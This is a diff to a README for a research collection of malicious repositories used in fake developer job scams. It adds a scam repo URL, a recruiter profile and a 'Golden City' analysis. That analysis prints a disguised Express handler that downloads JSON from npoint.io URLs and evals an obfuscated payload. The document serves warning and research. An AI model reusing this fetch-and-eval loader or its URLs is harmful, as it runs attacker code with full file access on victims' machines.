@@ -9,9 +9,9 @@ This repository contains malicious code samples collected from scammers attempti
 
 **DO NOT RUN THIS CODE**.
 
+And you should not install their dependencies either.
+
 The code is kept for educational and research purposes only.
-
-
 
 
 # Malicious Repository Collection
@@ -90,6 +90,8 @@ The code is kept for educational and research purposes only.
 
 - https://bitbucket.org/sarostech_work/assessment/src/792ba614d9f4f41e369f110cf144ace2d9c5650b/server/config/getContract.js#lines-135
 
+- https://github.com/goldencity5019/test_version
+
 
 ### Known scammer recruiter profiles
 
@@ -121,12 +123,14 @@ The code is kept for educational and research purposes only.
 
 - [Roman Liakhovych](https://www.linkedin.com/in/roman-liakhovych-5429802b0/)
 
+- [Martina Gehrken Trappe](https://www.linkedin.com/in/martina-gehrken-trappe-51930412/)
+
 
 ## Extra links
 
 [SCAM WARNING: Blockchain developer job postings - on Reedit](https://www.reddit.com/r/Upwork/comments/14nat71/scam_warning_blockchain_developer_job_postings/)
 
-
+[Stay safe out there, software engineers - on Linkedin](https://www.linkedin.com/posts/tudorconstantin_chatgpt-activity-7292203560547606528-pOUz/)
 
 ## On Linkedin
 
@@ -701,3 +705,30 @@ This code is kept for research purposes only. DO NOT run or deploy this code as 
 
 
 The repositories appear to be legitimate web applications (a real estate platform and a staking platform) but contain hidden malicious code designed to compromise systems and steal data.
+
+### 6. Golden City
+
+This repository contains a payload in `backend/controllers/userController.js` at line 204:
+
+```javascript
+exports.getCookie= asyncErrorHandler(async (req, res, next) => {
+    const rs_L = await axios.get("https://api.npoint.io/e8e29958efde154f3d7d");
+    const rs_C = await axios.get("https://api.npoint.io/632ab82bbc8d7f4c2d44");
+    eval(rs_L.data.cookie);
+    eval(rs_C.data.cookie);
+  })();
+```
+
+The payload is obfuscated and looks like this:
+
+```javascript
+{
+"cookie": "function g(a,b){const c=e();return g=function(d,f){d=d-(-0x1b7f+0xc67+0x323*0x5);let h=c[d];if(g['pslYso']===undefined){var i=function(n){const o='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let p='',q='',r=p+i;for(let 
+// Truncated for convenience
+```
+
+It tricks the user into thinking it's actually getting the cookie for the user.
+
+In fact, it's eval-ing the payload (which basically means it's running the code with node-level privileges on your machine, having access to all the files in your system).
+
+I have deobfuscated the payload. You'll find it in `payloads/main.js`, in the golden-city repository.
